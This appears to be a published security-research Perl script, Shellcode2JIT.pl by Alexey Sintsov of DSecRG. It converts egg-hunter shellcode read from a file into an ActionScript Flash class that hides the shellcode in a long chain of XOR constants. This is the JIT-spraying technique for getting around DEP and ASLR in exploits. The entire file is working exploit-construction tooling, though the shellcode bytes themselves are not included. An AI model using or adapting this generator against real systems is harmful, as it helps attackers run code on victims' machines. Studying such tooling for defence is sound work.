#!/usr/bin/perl
#
# Shellcode2JIT.pl
# 
# by Alexey Sintsov
# DSecRG
# 

open (FI,"<UNI_EGG.txt");
@base=<FI>;
close(FI);

print <<EOF;
//	egg-hunter shellcode
//  By Alexey Sintsov
//	dookie\@inbox.ru
//	a.sintsov\@dsec.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//

package {
    import flash.display.*
	public class Loadzz2 extends MovieClip
    {
		function funcXOR1()
		{
EOF


print "\t\t\tvar jit=(0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^";
foreach $strA(@base)
{
    my $jit;
	chomp($strA);
	my $str=substr($strA,2,8);
    $jit=sprintf("%s%s%s%s%s%s%s%s",substr($str,6,1),substr($str,7,1),substr($str,4,1),substr($str,5,1),substr($str,2,1),substr($str,3,1),substr($str,0,1),substr($str,1,1));
	print "\t\t\t0x$jit";
	print "^\n";
}

print "\t\t\t0x3ccccccc);";

print <<EOF;
			
			return jit;
		}
		
		function Loadzz2()
		{
				var ret1=funcXOR1();
		}
    }
}
EOF
